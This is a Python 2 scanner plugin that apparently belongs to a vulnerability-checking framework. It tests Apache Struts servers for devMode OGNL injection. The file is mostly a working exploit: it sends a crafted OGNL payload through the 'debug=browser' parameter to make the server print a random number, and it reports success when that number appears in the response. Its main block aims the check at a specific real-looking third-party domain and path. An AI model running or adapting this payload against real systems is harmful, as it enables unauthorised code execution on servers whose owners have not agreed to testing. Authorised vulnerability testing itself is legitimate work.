#!/usr/bin/env python
# encoding: utf-8
from t import T
import random,urllib2
class P(T):
    def __init__(self):
        T.__init__(self)
        keywords=['struts']

    def verify(self,head='',context='',ip='',port='80',productname={},keywords='',hackinfo=''):
        target_url = ''
        target_url = 'http://' + ip + ':' + port

        if productname.get('path', ''):
            target_url = 'http://' + ip + ':' + port + productname.get('path', '')
        else:
            from script import linktool
            listarray = linktool.getaction(target_url)
            if len(listarray) > 0:
                target_url = listarray[0]
            else:
                target_url = 'http://' + ip + ':' + port + '/login.action'
        result = {}
        timeout=3
        result['result']=False
        res=None
        content = str(random.randint(1000, 1000000))
        poc_url = "{url}?debug=browser&object=(%23mem=%23_memberAccess=@ognl.O" \
                  "gnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameter" \
                  "s.rpsobj[0]].getWriter().println(%23parameters.content[0]):" \
                  "xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher." \
                  "HttpServletResponse&content={content}".format(url=target_url, content=content)
        print target_url
        try:
            res=urllib2.urlopen(poc_url,timeout=timeout)
            res_html = res.read()
        except Exception,e:
            print e
            return result
        finally:
            if res is not None:
                res.close()
                del res
        #if random str in html:
        if content in res_html and 'xwork2.dispatcher' not in res_html:
            info = target_url + "struts devmode Vul"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='struts devmode Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=poc_url
            result['VerifyInfo']['result'] =info
            return result
        return result   

if __name__ == '__main__':
    productname = {}
    productname['path'] = '/register/addUi.action'
    print P().verify(ip='www.cdjzaq.com',port='80',productname=productname)                
            
            
            
            